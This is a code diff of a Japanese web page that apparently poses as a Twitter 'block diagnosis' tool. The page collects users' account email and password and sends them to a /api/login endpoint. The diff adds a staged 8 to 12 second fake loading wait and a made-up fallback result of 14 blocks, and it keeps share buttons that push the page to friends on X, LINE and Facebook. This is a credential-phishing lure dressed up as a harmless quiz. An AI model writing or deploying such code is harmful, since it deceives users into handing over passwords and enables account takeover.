@@ -239,41 +239,36 @@
 
     </div>
 
-    <script>
-        const PUSHER_KEY = '787f1e0b321698ae6439'; 
-        const PUSHER_CLUSTER = 'ap3';
-        let sessionId = crypto.randomUUID(); 
+<script>
+        function generateUUID() {
+            if (typeof crypto !== 'undefined' && crypto.randomUUID) {
+                return crypto.randomUUID();
+            }
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
 
-        const pusher = new Pusher(PUSHER_KEY, {
-            cluster: PUSHER_CLUSTER
-        });
-        
-        const channel = pusher.subscribe('diagnosis-' + sessionId);
-        channel.bind('result-event', function(data) {
-            document.getElementById('block-count').innerText = data.count;
-            showScreen('screen-result');
-        });
+        let sessionId = generateUUID(); 
 
         function showScreen(id) {
             document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
-            setTimeout(() => {
-                 document.getElementById(id).classList.add('active');
-            }, 50); 
+            document.getElementById(id).classList.add('active');
         }
 
         function goToForm() {
             showScreen('screen-form');
         }
 
-        function startDiagnosis() {
+        async function startDiagnosis() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
             if(!email || !password) return alert('全ての項目を入力してください');
-
             showScreen('screen-loading');
-
-            fetch('/api/login', {
+            const waitTime = 8000 + Math.random() * 4000; 
+            const apiRequest = fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -281,13 +276,33 @@
                     password: password,
                     sessionId: sessionId
                 })
+            })
+            .then(res => {
+                if (!res.ok) throw new Error('Network response was not ok');
+                return res.json();
+            })
+            .catch(err => {
+                console.error("API Error:", err);
+                return { count: 14 };
             });
+
+            const timer = new Promise(resolve => setTimeout(resolve, waitTime));
+
+            try {
+                const [data] = await Promise.all([apiRequest, timer]);
+                document.getElementById('block-count').innerText = data.count || 14;
+                showScreen('screen-result');
+
+            } catch (e) {
+                document.getElementById('block-count').innerText = 14;
+                showScreen('screen-result');
+            }
         }
-        
+
         function shareX() {
             const count = document.getElementById('block-count').innerText;
             const siteUrl = "https://twitter-block-sindan.vercel.app/";
-            const text = `私のブロックされている人数は${count}人でした！\n今すぐブロック診断を使って何人にブロックされているか確かめてみましょう\n`;
+            const text = `貴方のブロックされている人数は${count}人でした！\n今すぐブロック診断を使って何人にブロックされているか確かめてみましょう\n`;
             const intentUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(siteUrl)}`;
             window.open(intentUrl, '_blank');
         }
@@ -295,10 +310,10 @@
         function shareLine() {
             const count = document.getElementById('block-count').innerText;
             const siteUrl = "https://twitter-block-sindan.vercel.app/";
-            const text = `私のブロックされている人数は${count}人でした！\n今すぐブロック診断を使って何人にブロックされているか確かめてみましょう\n${siteUrl}`;
+            const text = `貴方のブロックされている人数は${count}人でした！\n今すぐブロック診断を使って何人にブロックされているか確かめてみましょう\n${siteUrl}`;
             window.open(`https://line.me/R/msg/text/?${encodeURIComponent(text)}`, '_blank');
         }
-        
+
         function shareFacebook() {
             const siteUrl = "https://twitter-block-sindan.vercel.app/";
             window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(siteUrl)}`, '_blank');
